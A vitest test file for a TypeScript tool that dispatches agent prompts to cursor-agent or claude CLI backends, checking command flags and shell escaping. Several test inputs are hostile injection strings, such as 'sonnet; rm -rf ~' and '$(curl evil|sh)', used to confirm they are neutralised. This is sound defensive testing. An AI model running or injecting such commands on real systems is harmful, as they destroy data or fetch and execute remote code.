/**
 * @description Tests for {@link runIteration} / {@link runIterationAsync} backend dispatch and
 * shell commands passed to {@link spawnSync} / {@link spawn}.
 */

import type { ChildProcess } from 'child_process';
import { spawn, spawnSync } from 'child_process';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { runIteration, runIterationAsync } from '../run-iteration';

vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>();
  return {
    ...actual,
    spawn: vi.fn(),
    spawnSync: vi.fn(),
  };
});

describe('runIteration (sync) backend dispatch', () => {
  beforeEach(() => {
    vi.mocked(spawnSync).mockClear();
    vi.mocked(spawnSync).mockReturnValue({
      error: undefined,
      output: ['done'],
      pid: 0,
      signal: null,
      status: 0,
      stderr: '',
      stdout: 'done',
    });
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('defaults to cursor-agent when backend omitted', () => {
    runIteration({
      agentPrompt: 'x',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('invokes cursor-agent for --backend cursor', () => {
    runIteration({
      agentPrompt: 'hello "world"',
      backend: 'cursor',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
    expect(firstArg).toContain('hello \\"world\\"');
  });

  it('invokes claude CLI for --backend claude', () => {
    runIteration({
      agentPrompt: 'task',
      backend: 'claude',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(
      /^claude --bare -p --permission-mode acceptEdits "/,
    );
    expect(firstArg).not.toContain('--model');
  });

  it('omits --model for claude when model is auto', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'auto',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).not.toContain('--model');
  });

  it('passes --model for claude when model is set', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'sonnet',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model sonnet');
  });

  it('escapes a malicious --model value for claude (no shell injection)', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'sonnet; rm -rf ~',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model "sonnet; rm -rf ~"');
    expect(firstArg).not.toContain(' --model sonnet; rm');
  });

  it('escapes a malicious --model value for cursor (no shell injection)', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      model: '$(curl evil|sh)',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model "$(curl evil|sh)"');
    expect(firstArg).not.toMatch(/--model \$\(curl evil\|sh\)(?!")/);
  });

  it('passes -w worktree for cursor when configured', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      worktree: 'my-wt',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/cursor-agent --force -p "/);
    expect(firstArg).toContain('-w my-wt');
  });

  it('passes cursor-only worktree-base and skip-worktree-setup', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      skipWorktreeSetup: true,
      worktree: 'my-wt',
      worktreeBase: 'main',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w my-wt');
    expect(firstArg).toContain('--worktree-base main');
    expect(firstArg).toContain('--skip-worktree-setup');
  });

  it('passes -w worktree for claude when configured', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      worktree: 'my-wt',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(
      /^claude --bare -p --permission-mode acceptEdits "/,
    );
    expect(firstArg).toContain('-w my-wt');
    expect(firstArg).not.toContain('--worktree-base');
  });

  it('neutralizes $(...) command substitution in the prompt (cursor)', () => {
    runIteration({
      agentPrompt: 'plan: $(curl evil|sh) done',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('plan: \\$(curl evil|sh) done');
    expect(firstArg).not.toContain('plan: $(curl evil|sh) done');
  });

  it('neutralizes backtick command substitution in the prompt (cursor)', () => {
    runIteration({
      agentPrompt: 'task `id` here',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('task \\`id\\` here');
    expect(firstArg).not.toContain('task `id` here');
  });

  it('neutralizes ${...} parameter expansion in the prompt (claude)', () => {
    runIteration({
      agentPrompt: 'leak ${HOME} now',
      backend: 'claude',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('leak \\${HOME} now');
    expect(firstArg).not.toContain('leak ${HOME} now');
  });
});

describe('runIterationAsync backend dispatch', () => {
  beforeEach(() => {
    vi.mocked(spawn).mockClear();
    vi.mocked(spawn).mockImplementation((): ChildProcess => {
      const child = new EventEmitter() as unknown as ChildProcess;
      child.stdout = new PassThrough();
      child.stderr = new PassThrough();
      child.kill = vi.fn(() => true);
      (child as any).killed = false;
      queueMicrotask(() => {
        child.emit('close', 0);
      });
      return child;
    });
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('defaults to cursor-agent when backend omitted', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('spawns claude command for --backend claude', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'claude',
      iteration: 2,
    });
    expect(spawn).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(
      /^claude --bare -p --permission-mode acceptEdits "/,
    );
  });

  it('spawns cursor-agent for --backend cursor', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('passes -w worktree on async cursor iteration', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      iteration: 1,
      worktree: 'async-wt',
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w async-wt');
  });

  it('passes -w worktree on async claude iteration', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'claude',
      iteration: 2,
      worktree: 'async-wt',
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w async-wt');
  });

  it('neutralizes $(...) and backticks in the async prompt', async () => {
    await runIterationAsync({
      agentPrompt: 'inject $(id) and `whoami`',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('inject \\$(id) and \\`whoami\\`');
    expect(firstArg).not.toContain('inject $(id) and `whoami`');
  });
});
